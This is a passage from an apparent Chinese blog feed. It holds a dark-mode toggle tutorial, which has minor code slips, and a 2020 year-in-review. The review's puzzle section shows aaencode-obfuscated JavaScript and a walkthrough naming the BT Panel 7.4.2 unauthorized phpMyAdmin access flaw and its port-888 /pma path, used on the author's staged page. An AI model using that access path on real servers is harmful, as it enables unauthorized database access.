之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a 